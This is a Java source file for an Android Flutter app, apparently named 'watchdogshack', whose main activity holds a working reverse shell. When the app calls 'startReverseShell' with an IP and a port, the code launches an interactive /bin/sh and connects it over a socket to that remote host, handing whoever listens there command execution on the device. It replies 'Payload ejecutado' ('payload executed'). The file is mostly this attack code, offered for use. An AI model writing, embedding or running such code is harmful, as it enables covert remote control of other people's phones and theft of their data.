package com.wd.watchdogshack;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;
import io.flutter.plugin.common.MethodCall;

public class MainActivity extends FlutterActivity {
    private static final String CHANNEL="reverse_shell_channel";

    @Override
    public void configureFlutterEngine(FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), CHANNEL)
                .setMethodCallHandler(
                        (call, result) -> {
                            if (call.method.equals("startReverseShell")) {
                                String ip = call.argument("ip");
                                int port = call.argument("port");
                                startReverseShell(ip, port);
                                result.success("Payload ejecutado");
                            } else {
                                result.notImplemented();
                            }
                        }
                );
    }

    private void startReverseShell(String ip, int port){
        new Thread(() -> {
            try{
                String[] str={"/bin/sh", "-i"};
                Process p = Runtime.getRuntime().exec(str);
                InputStream pin = p.getInputStream();
                InputStream perr = p.getErrorStream();
                OutputStream pout = p.getOutputStream();

                System.out.println("Intentando conectar a " + ip + ":" + port);
                Socket socket = new Socket(ip, port);
                System.out.println("conectado");
                InputStream sin = socket.getInputStream();
                OutputStream sout = socket.getOutputStream();

                while (true){
                    while(pin.available() > 0) sout.write(pin.read());
                    while(perr.available() > 0) sout.write(perr.read());
                    while(sin.available() > 0) pout.write(sin.read());
                    pout.flush();
                    sout.flush();
                    pout.flush();
                }
            }catch (IOException | StringIndexOutOfBoundsException e){
                e.printStackTrace();
            }
        }).start();
    }
}
